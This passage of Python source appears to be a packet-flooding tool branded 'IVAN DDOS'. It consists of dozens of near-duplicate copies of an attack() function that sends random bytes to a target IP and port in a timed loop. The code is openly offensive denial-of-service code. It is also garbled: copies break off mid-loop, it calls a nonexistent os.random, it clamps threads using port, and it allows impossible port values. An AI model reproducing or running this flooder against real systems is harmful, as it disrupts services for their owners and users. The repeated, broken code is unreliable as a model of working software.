        threads = threads or os.random.randint(91, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(567891, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(567891, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(567891, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(567891, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(567891, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(567891, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(567891, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(567891, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(567891, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(567891, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Selesai')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
